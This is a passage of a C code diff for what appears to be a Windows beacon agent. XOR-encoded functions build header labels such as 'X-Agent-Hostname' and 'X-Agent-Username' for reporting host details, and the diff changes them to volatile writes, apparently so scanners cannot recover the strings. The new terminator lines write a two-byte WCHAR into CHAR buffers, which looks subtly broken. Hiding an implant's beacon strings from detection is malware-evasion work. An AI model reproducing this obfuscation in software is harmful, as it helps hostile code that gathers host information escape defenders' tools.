-    buf[7] = (CHAR)(0x50u ^ key);
-    buf[8] = (CHAR)(0x3Eu ^ key);
-    buf[9] = (CHAR)(0x1Cu ^ key);
-    buf[10] = (CHAR)(0x0Du ^ key);
-    buf[11] = (CHAR)(0x1Cu ^ key);
-    buf[12] = (CHAR)(0x1Fu ^ key);
-    buf[13] = (CHAR)(0x14u ^ key);
-    buf[14] = (CHAR)(0x11u ^ key);
-    buf[15] = (CHAR)(0x14u ^ key);
-    buf[16] = (CHAR)(0x09u ^ key);
-    buf[17] = (CHAR)(0x14u ^ key);
-    buf[18] = (CHAR)(0x18u ^ key);
-    buf[19] = (CHAR)(0x0Eu ^ key);
-    buf[20] = (CHAR)(0x47u ^ key);
-    buf[21] = (CHAR)(0x5Du ^ key);
-    buf[22] = (CHAR)(0x4Du ^ key);
-    buf[23] = (CHAR)(0x4Cu ^ key);
-    buf[24] = (CHAR)(0x4Du ^ key);
-    buf[25] = (CHAR)(0x4Du ^ key);
-    buf[26] = (CHAR)(0x4Du ^ key);
-    buf[27] = (CHAR)(0x4Du ^ key);
-    buf[28] = (CHAR)(0x4Du ^ key);
-    buf[29] = (CHAR)(0x4Du ^ key);
-    buf[30] = (CHAR)(0x4Du ^ key);
-    buf[31] = (CHAR)(0x4Du ^ key);
-    buf[32] = (CHAR)(0x4Du ^ key);
-    buf[33] = (CHAR)(0x4Du ^ key);
-    buf[34] = (CHAR)(0x4Du ^ key);
-    buf[35] = (CHAR)(0x4Du ^ key);
-    buf[36] = (CHAR)(0x4Du ^ key);
-    buf[37] = (CHAR)(0x4Du ^ key);
-    buf[38] = (CHAR)(0x70u ^ key);
-    buf[39] = (CHAR)(0x77u ^ key);
-    buf[40] = 0;
+    *(volatile CHAR *)&buf[0] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[3] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[4] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x13u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x3Eu ^ key);
+    *(volatile CHAR *)&buf[9] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[11] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x1Fu ^ key);
+    *(volatile CHAR *)&buf[13] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x11u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x0Eu ^ key);
+    *(volatile CHAR *)&buf[20] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[21] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[22] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[23] = (0x4Cu ^ key);
+    *(volatile CHAR *)&buf[24] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[25] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[26] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[27] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[28] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[29] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[30] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[31] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[32] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[33] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[34] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[35] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[36] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[37] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[38] = (0x70u ^ key);
+    *(volatile CHAR *)&buf[39] = (0x77u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[40] = 0;
 }
 
 static VOID StrLblUuid(PCHAR buf)
 {
     volatile UINT32 key = 0x1F;
-    buf[0] = (CHAR)(0x47u ^ key);
-    buf[1] = (CHAR)(0x32u ^ key);
-    buf[2] = (CHAR)(0x5Eu ^ key);
-    buf[3] = (CHAR)(0x78u ^ key);
-    buf[4] = (CHAR)(0x7Au ^ key);
-    buf[5] = (CHAR)(0x71u ^ key);
-    buf[6] = (CHAR)(0x6Bu ^ key);
-    buf[7] = (CHAR)(0x32u ^ key);
-    buf[8] = (CHAR)(0x52u ^ key);
-    buf[9] = (CHAR)(0x7Eu ^ key);
-    buf[10] = (CHAR)(0x7Cu ^ key);
-    buf[11] = (CHAR)(0x77u ^ key);
-    buf[12] = (CHAR)(0x76u ^ key);
-    buf[13] = (CHAR)(0x71u ^ key);
-    buf[14] = (CHAR)(0x7Au ^ key);
-    buf[15] = (CHAR)(0x32u ^ key);
-    buf[16] = (CHAR)(0x4Au ^ key);
-    buf[17] = (CHAR)(0x6Au ^ key);
-    buf[18] = (CHAR)(0x76u ^ key);
-    buf[19] = (CHAR)(0x7Bu ^ key);
-    buf[20] = (CHAR)(0x25u ^ key);
-    buf[21] = (CHAR)(0x3Fu ^ key);
-    buf[22] = 0;
+    *(volatile CHAR *)&buf[0] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x32u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[3] = (0x78u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x7Au ^ key);
+    *(volatile CHAR *)&buf[5] = (0x71u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x6Bu ^ key);
+    *(volatile CHAR *)&buf[7] = (0x32u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x7Eu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x7Cu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x77u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x71u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x7Au ^ key);
+    *(volatile CHAR *)&buf[15] = (0x32u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x4Au ^ key);
+    *(volatile CHAR *)&buf[17] = (0x6Au ^ key);
+    *(volatile CHAR *)&buf[18] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x7Bu ^ key);
+    *(volatile CHAR *)&buf[20] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[21] = (0x3Fu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[22] = 0;
 }
 
 static VOID StrLblHostname(PCHAR buf)
 {
     volatile UINT32 key = 0x64;
-    buf[0] = (CHAR)(0x3Cu ^ key);
-    buf[1] = (CHAR)(0x49u ^ key);
-    buf[2] = (CHAR)(0x25u ^ key);
-    buf[3] = (CHAR)(0x03u ^ key);
-    buf[4] = (CHAR)(0x01u ^ key);
-    buf[5] = (CHAR)(0x0Au ^ key);
-    buf[6] = (CHAR)(0x10u ^ key);
-    buf[7] = (CHAR)(0x49u ^ key);
-    buf[8] = (CHAR)(0x2Cu ^ key);
-    buf[9] = (CHAR)(0x0Bu ^ key);
-    buf[10] = (CHAR)(0x17u ^ key);
-    buf[11] = (CHAR)(0x10u ^ key);
-    buf[12] = (CHAR)(0x0Au ^ key);
-    buf[13] = (CHAR)(0x05u ^ key);
-    buf[14] = (CHAR)(0x09u ^ key);
-    buf[15] = (CHAR)(0x01u ^ key);
-    buf[16] = (CHAR)(0x5Eu ^ key);
-    buf[17] = (CHAR)(0x44u ^ key);
-    buf[18] = 0;
+    *(volatile CHAR *)&buf[0] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x49u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x03u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x0Au ^ key);
+    *(volatile CHAR *)&buf[6] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x49u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x2Cu ^ key);
+    *(volatile CHAR *)&buf[9] = (0x0Bu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x17u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x0Au ^ key);
+    *(volatile CHAR *)&buf[13] = (0x05u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[17] = (0x44u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[18] = 0;
 }
 
 static VOID StrLblUsername(PCHAR buf)
 {
     volatile UINT32 key = 0x2A;
-    buf[0] = (CHAR)(0x72u ^ key);
-    buf[1] = (CHAR)(0x07u ^ key);
-    buf[2] = (CHAR)(0x6Bu ^ key);
-    buf[3] = (CHAR)(0x4Du ^ key);
-    buf[4] = (CHAR)(0x4Fu ^ key);
-    buf[5] = (CHAR)(0x44u ^ key);
-    buf[6] = (CHAR)(0x5Eu ^ key);
-    buf[7] = (CHAR)(0x07u ^ key);
-    buf[8] = (CHAR)(0x7Fu ^ key);
-    buf[9] = (CHAR)(0x59u ^ key);
-    buf[10] = (CHAR)(0x4Fu ^ key);
-    buf[11] = (CHAR)(0x58u ^ key);
-    buf[12] = (CHAR)(0x44u ^ key);
-    buf[13] = (CHAR)(0x4Bu ^ key);
-    buf[14] = (CHAR)(0x47u ^ key);
-    buf[15] = (CHAR)(0x4Fu ^ key);
-    buf[16] = (CHAR)(0x10u ^ key);
-    buf[17] = (CHAR)(0x0Au ^ key);
-    buf[18] = 0;
+    *(volatile CHAR *)&buf[0] = (0x72u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x07u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x6Bu ^ key);
+    *(volatile CHAR *)&buf[3] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[4] = (0x4Fu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[7] = (0x07u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x7Fu ^ key);
+    *(volatile CHAR *)&buf[9] = (0x59u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x4Fu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x4Bu ^ key);
+    *(volatile CHAR *)&buf[14] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x4Fu ^ key);
+    *(volatile CHAR *)&buf[16] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x0Au ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[18] = 0;
 }
 
 static VOID StrLblOsVersion(PCHAR buf)
 {
     volatile UINT32 key = 0x53;
-    buf[0] = (CHAR)(0x0Bu ^ key);
-    buf[1] = (CHAR)(0x7Eu ^ key);
-    buf[2] = (CHAR)(0x12u ^ key);
-    buf[3] = (CHAR)(0x34u ^ key);
-    buf[4] = (CHAR)(0x36u ^ key);
-    buf[5] = (CHAR)(0x3Du ^ key);
-    buf[6] = (CHAR)(0x27u ^ key);
-    buf[7] = (CHAR)(0x7Eu ^ key);
-    buf[8] = (CHAR)(0x1Cu ^ key);
-    buf[9] = (CHAR)(0x20u ^ key);
-    buf[10] = (CHAR)(0x7Eu ^ key);
-    buf[11] = (CHAR)(0x05u ^ key);
-    buf[12] = (CHAR)(0x36u ^ key);
-    buf[13] = (CHAR)(0x21u ^ key);
-    buf[14] = (CHAR)(0x20u ^ key);
-    buf[15] = (CHAR)(0x3Au ^ key);
-    buf[16] = (CHAR)(0x3Cu ^ key);
-    buf[17] = (CHAR)(0x3Du ^ key);
-    buf[18] = (CHAR)(0x69u ^ key);
-    buf[19] = (CHAR)(0x73u ^ key);
-    buf[20] = 0;
+    *(volatile CHAR *)&buf[0] = (0x0Bu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x7Eu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x36u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[6] = (0x27u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x7Eu ^ key);
+    *(volatile CHAR *)&buf[8] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[9] = (0x20u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x7Eu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x05u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x36u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x21u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x20u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x3Au ^ key);
+    *(volatile CHAR *)&buf[16] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[17] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[18] = (0x69u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x73u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[20] = 0;
 }
 
 static VOID StrLblBuild(PCHAR buf)
 {
     volatile UINT32 key = 0x30;
-    buf[0] = (CHAR)(0x68u ^ key);
-    buf[1] = (CHAR)(0x1Du ^ key);
-    buf[2] = (CHAR)(0x71u ^ key);
-    buf[3] = (CHAR)(0x57u ^ key);
-    buf[4] = (CHAR)(0x55u ^ key);
-    buf[5] = (CHAR)(0x5Eu ^ key);
-    buf[6] = (CHAR)(0x44u ^ key);
-    buf[7] = (CHAR)(0x1Du ^ key);
-    buf[8] = (CHAR)(0x72u ^ key);
-    buf[9] = (CHAR)(0x45u ^ key);
-    buf[10] = (CHAR)(0x59u ^ key);
-    buf[11] = (CHAR)(0x5Cu ^ key);
-    buf[12] = (CHAR)(0x54u ^ key);
-    buf[13] = (CHAR)(0x0Au ^ key);
-    buf[14] = (CHAR)(0x10u ^ key);
-    buf[15] = 0;
+    *(volatile CHAR *)&buf[0] = (0x68u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x1Du ^ key);
+    *(volatile CHAR *)&buf[2] = (0x71u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x57u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x55u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x1Du ^ key);
+    *(volatile CHAR *)&buf[8] = (0x72u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x59u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x0Au ^ key);
+    *(volatile CHAR *)&buf[14] = (0x10u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[15] = 0;
 }
 
 static VOID StrLblCommit(PCHAR buf)
 {
     volatile UINT32 key = 0x5B;
-    buf[0] = (CHAR)(0x03u ^ key);
-    buf[1] = (CHAR)(0x76u ^ key);
-    buf[2] = (CHAR)(0x1Au ^ key);
-    buf[3] = (CHAR)(0x3Cu ^ key);
-    buf[4] = (CHAR)(0x3Eu ^ key);
-    buf[5] = (CHAR)(0x35u ^ key);
-    buf[6] = (CHAR)(0x2Fu ^ key);
-    buf[7] = (CHAR)(0x76u ^ key);
-    buf[8] = (CHAR)(0x18u ^ key);
-    buf[9] = (CHAR)(0x34u ^ key);
-    buf[10] = (CHAR)(0x36u ^ key);
-    buf[11] = (CHAR)(0x36u ^ key);
-    buf[12] = (CHAR)(0x32u ^ key);
-    buf[13] = (CHAR)(0x2Fu ^ key);
-    buf[14] = (CHAR)(0x61u ^ key);
-    buf[15] = (CHAR)(0x7Bu ^ key);
-    buf[16] = 0;
+    *(volatile CHAR *)&buf[0] = (0x03u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x3Eu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x35u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x2Fu ^ key);
+    *(volatile CHAR *)&buf[7] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x36u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x36u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x2Fu ^ key);
+    *(volatile CHAR *)&buf[14] = (0x61u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x7Bu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
 }
 
 static VOID StrValArchX64(PCHAR buf)
 {
     volatile UINT32 key = 0x24;
-    buf[0] = (CHAR)(0x7Cu ^ key);
-    buf[1] = (CHAR)(0x09u ^ key);
-    buf[2] = (CHAR)(0x65u ^ key);
-    buf[3] = (CHAR)(0x43u ^ key);
-    buf[4] = (CHAR)(0x41u ^ key);
-    buf[5] = (CHAR)(0x4Au ^ key);
-    buf[6] = (CHAR)(0x50u ^ key);
-    buf[7] = (CHAR)(0x09u ^ key);
-    buf[8] = (CHAR)(0x65u ^ key);
-    buf[9] = (CHAR)(0x56u ^ key);
-    buf[10] = (CHAR)(0x47u ^ key);
-    buf[11] = (CHAR)(0x4Cu ^ key);
-    buf[12] = (CHAR)(0x1Eu ^ key);
-    buf[13] = (CHAR)(0x04u ^ key);
-    buf[14] = (CHAR)(0x5Cu ^ key);
-    buf[15] = (CHAR)(0x1Cu ^ key);
-    buf[16] = (CHAR)(0x12u ^ key);
-    buf[17] = (CHAR)(0x7Bu ^ key);
-    buf[18] = (CHAR)(0x12u ^ key);
-    buf[19] = (CHAR)(0x10u ^ key);
-    buf[20] = (CHAR)(0x29u ^ key);
-    buf[21] = (CHAR)(0x2Eu ^ key);
-    buf[22] = (CHAR)(0x7Cu ^ key);
-    buf[23] = (CHAR)(0x09u ^ key);
-    buf[24] = (CHAR)(0x65u ^ key);
-    buf[25] = (CHAR)(0x43u ^ key);
-    buf[26] = (CHAR)(0x41u ^ key);
-    buf[27] = (CHAR)(0x4Au ^ key);
-    buf[28] = (CHAR)(0x50u ^ key);
-    buf[29] = (CHAR)(0x09u ^ key);
-    buf[30] = (CHAR)(0x74u ^ key);
-    buf[31] = (CHAR)(0x56u ^ key);
-    buf[32] = (CHAR)(0x4Bu ^ key);
-    buf[33] = (CHAR)(0x47u ^ key);
-    buf[34] = (CHAR)(0x41u ^ key);
-    buf[35] = (CHAR)(0x57u ^ key);
-    buf[36] = (CHAR)(0x57u ^ key);
-    buf[37] = (CHAR)(0x09u ^ key);
-    buf[38] = (CHAR)(0x65u ^ key);
-    buf[39] = (CHAR)(0x56u ^ key);
-    buf[40] = (CHAR)(0x47u ^ key);
-    buf[41] = (CHAR)(0x4Cu ^ key);
-    buf[42] = (CHAR)(0x1Eu ^ key);
-    buf[43] = (CHAR)(0x04u ^ key);
-    buf[44] = (CHAR)(0x5Cu ^ key);
-    buf[45] = (CHAR)(0x1Cu ^ key);
-    buf[46] = (CHAR)(0x12u ^ key);
-    buf[47] = (CHAR)(0x7Bu ^ key);
-    buf[48] = (CHAR)(0x12u ^ key);
-    buf[49] = (CHAR)(0x10u ^ key);
-    buf[50] = (CHAR)(0x29u ^ key);
-    buf[51] = (CHAR)(0x2Eu ^ key);
-    buf[52] = 0;
+    *(volatile CHAR *)&buf[0] = (0x7Cu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x41u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x4Au ^ key);
+    *(volatile CHAR *)&buf[6] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x4Cu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x1Eu ^ key);
+    *(volatile CHAR *)&buf[13] = (0x04u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[15] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[16] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x7Bu ^ key);
+    *(volatile CHAR *)&buf[18] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[20] = (0x29u ^ key);
+    *(volatile CHAR *)&buf[21] = (0x2Eu ^ key);
+    *(volatile CHAR *)&buf[22] = (0x7Cu ^ key);
+    *(volatile CHAR *)&buf[23] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[24] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[25] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[26] = (0x41u ^ key);
+    *(volatile CHAR *)&buf[27] = (0x4Au ^ key);
+    *(volatile CHAR *)&buf[28] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[29] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[30] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[31] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[32] = (0x4Bu ^ key);
+    *(volatile CHAR *)&buf[33] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[34] = (0x41u ^ key);
+    *(volatile CHAR *)&buf[35] = (0x57u ^ key);
+    *(volatile CHAR *)&buf[36] = (0x57u ^ key);
+    *(volatile CHAR *)&buf[37] = (0x09u ^ key);
+    *(volatile CHAR *)&buf[38] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[39] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[41] = (0x4Cu ^ key);
+    *(volatile CHAR *)&buf[42] = (0x1Eu ^ key);
+    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
+    *(volatile CHAR *)&buf[44] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[45] = (0x1Cu ^ key);
+    *(volatile CHAR *)&buf[46] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[47] = (0x7Bu ^ key);
+    *(volatile CHAR *)&buf[48] = (0x12u ^ key);
+    *(volatile CHAR *)&buf[49] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[50] = (0x29u ^ key);
+    *(volatile CHAR *)&buf[51] = (0x2Eu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[52] = 0;
 }
 
 static VOID StrValArchI386(PCHAR buf)
 {
     volatile UINT32 key = 0x37;
-    buf[0] = (CHAR)(0x6Fu ^ key);
-    buf[1] = (CHAR)(0x1Au ^ key);
-    buf[2] = (CHAR)(0x76u ^ key);
-    buf[3] = (CHAR)(0x50u ^ key);
-    buf[4] = (CHAR)(0x52u ^ key);
-    buf[5] = (CHAR)(0x59u ^ key);
-    buf[6] = (CHAR)(0x43u ^ key);
-    buf[7] = (CHAR)(0x1Au ^ key);
-    buf[8] = (CHAR)(0x76u ^ key);
-    buf[9] = (CHAR)(0x45u ^ key);
-    buf[10] = (CHAR)(0x54u ^ key);
-    buf[11] = (CHAR)(0x5Fu ^ key);
-    buf[12] = (CHAR)(0x0Du ^ key);
-    buf[13] = (CHAR)(0x17u ^ key);
-    buf[14] = (CHAR)(0x5Eu ^ key);
-    buf[15] = (CHAR)(0x04u ^ key);
-    buf[16] = (CHAR)(0x0Fu ^ key);
-    buf[17] = (CHAR)(0x01u ^ key);
-    buf[18] = (CHAR)(0x3Au ^ key);
-    buf[19] = (CHAR)(0x3Du ^ key);
-    buf[20] = (CHAR)(0x6Fu ^ key);
-    buf[21] = (CHAR)(0x1Au ^ key);
-    buf[22] = (CHAR)(0x76u ^ key);
-    buf[23] = (CHAR)(0x50u ^ key);
-    buf[24] = (CHAR)(0x52u ^ key);
-    buf[25] = (CHAR)(0x59u ^ key);
-    buf[26] = (CHAR)(0x43u ^ key);
-    buf[27] = (CHAR)(0x1Au ^ key);
-    buf[28] = (CHAR)(0x67u ^ key);
-    buf[29] = (CHAR)(0x45u ^ key);
-    buf[30] = (CHAR)(0x58u ^ key);
-    buf[31] = (CHAR)(0x54u ^ key);
-    buf[32] = (CHAR)(0x52u ^ key);
-    buf[33] = (CHAR)(0x44u ^ key);
-    buf[34] = (CHAR)(0x44u ^ key);
-    buf[35] = (CHAR)(0x1Au ^ key);
-    buf[36] = (CHAR)(0x76u ^ key);
-    buf[37] = (CHAR)(0x45u ^ key);
-    buf[38] = (CHAR)(0x54u ^ key);
-    buf[39] = (CHAR)(0x5Fu ^ key);
-    buf[40] = (CHAR)(0x0Du ^ key);
-    buf[41] = (CHAR)(0x17u ^ key);
-    buf[42] = (CHAR)(0x5Eu ^ key);
-    buf[43] = (CHAR)(0x04u ^ key);
-    buf[44] = (CHAR)(0x0Fu ^ key);
-    buf[45] = (CHAR)(0x01u ^ key);
-    buf[46] = (CHAR)(0x3Au ^ key);
-    buf[47] = (CHAR)(0x3Du ^ key);
-    buf[48] = 0;
+    *(volatile CHAR *)&buf[0] = (0x6Fu ^ key);
+    *(volatile CHAR *)&buf[1] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[2] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x59u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[8] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x5Fu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[13] = (0x17u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[15] = (0x04u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x0Fu ^ key);
+    *(volatile CHAR *)&buf[17] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x3Au ^ key);
+    *(volatile CHAR *)&buf[19] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[20] = (0x6Fu ^ key);
+    *(volatile CHAR *)&buf[21] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[22] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[23] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[24] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[25] = (0x59u ^ key);
+    *(volatile CHAR *)&buf[26] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[27] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[28] = (0x67u ^ key);
+    *(volatile CHAR *)&buf[29] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[30] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[31] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[32] = (0x52u ^ key);
+    *(volatile CHAR *)&buf[33] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[34] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[35] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[36] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[37] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[38] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[39] = (0x5Fu ^ key);
+    *(volatile CHAR *)&buf[40] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[41] = (0x17u ^ key);
+    *(volatile CHAR *)&buf[42] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
+    *(volatile CHAR *)&buf[44] = (0x0Fu ^ key);
+    *(volatile CHAR *)&buf[45] = (0x01u ^ key);
+    *(volatile CHAR *)&buf[46] = (0x3Au ^ key);
+    *(volatile CHAR *)&buf[47] = (0x3Du ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[48] = 0;
 }
 
 static VOID StrValArchArm64(PCHAR buf)
 {
     volatile UINT32 key = 0x35;
-    buf[0] = (CHAR)(0x6Du ^ key);
